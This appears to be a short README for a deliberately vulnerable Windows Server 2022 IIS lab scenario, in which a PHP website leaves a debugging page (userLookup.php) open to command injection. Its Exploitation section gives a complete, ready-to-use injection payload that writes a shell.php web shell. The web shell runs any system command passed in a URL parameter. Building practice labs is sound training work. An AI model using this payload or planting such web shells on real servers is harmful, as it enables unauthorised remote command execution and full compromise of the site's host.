# Windows Server 2022 IIS

Files for Windows Server 2022 IIS scenario.


## Scenario

Company website using php leaves a debugging panel open that allows for php command injection.


## Exploitation

Use the insecure debugging page left open on userLookup.php to php injection a shell.php webshell page into the website.

PAYLOAD:
```
'& (echo ^<html^> & echo ^<body^> & echo ^<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"^> &  echo ^<input type="TEXT" name="cmd" id="cmd" size="80"^> & echo ^<input type="SUBMIT" value="Execute"^> & echo ^</form^> & echo ^<pre^> & echo ^<?php & echo     if^(isset^($_GET['cmd']^)^) & echo     { & echo         system^($_GET['cmd']^); & echo     } & echo ?^> & echo ^</pre^> & echo ^</body^> & echo ^<script^>document.getElementById^("cmd"^).focus^(^);^</script^> & echo ^</html^>) > shell.php & echo '```
